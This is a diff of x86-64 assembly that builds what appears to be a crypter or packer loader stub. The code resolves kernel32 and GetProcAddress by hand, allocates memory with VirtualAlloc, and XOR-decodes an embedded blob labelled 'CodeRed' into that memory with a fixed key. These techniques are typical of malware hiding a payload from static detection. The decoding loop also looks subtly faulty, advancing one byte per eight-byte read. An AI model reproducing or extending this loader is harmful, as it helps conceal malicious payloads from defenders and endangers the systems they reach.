@@ -109,8 +109,7 @@ section .deccode
 	
 	call Locate_kernel32
 	call GetProcAddres
-	mov rdi,r8
-	
+
 	;Lookup VirtualAlloc
 	mov rax, "lloc"
 	push rax
@@ -122,18 +121,36 @@ section .deccode
 	call r14
 	mov r12,rax
 	add rsp, 0x30
-
+	
 	;call VirtualAlloc
 	mov r9d, 0x04
 	mov r8d, 0x1000
-	mov rdi, [TamArqProgram]
+	mov rdi, 0xC3500
 	mov edx, edi
 	mov ecx, 0x00
 	sub rsp, 0x30
 	call r12
 	add rsp, 0x30
 	mov rbx,rax
+	mov rdi, rbx
+	
+	mov rax, CodeRed
+	xor rcx,rcx
+	DecArq:
+		mov rdx, [rax]
+		xor rdx, 0xC0FFEE
+		mov [rbx],rdx
+		inc rbx
+		inc rax
+		inc RCX
+		cmp rcx, 0xC3500
+		jne DecArq
+	
+	call Locate_kernel32
+	
 ret
+	
+	
 			
  
 section .text
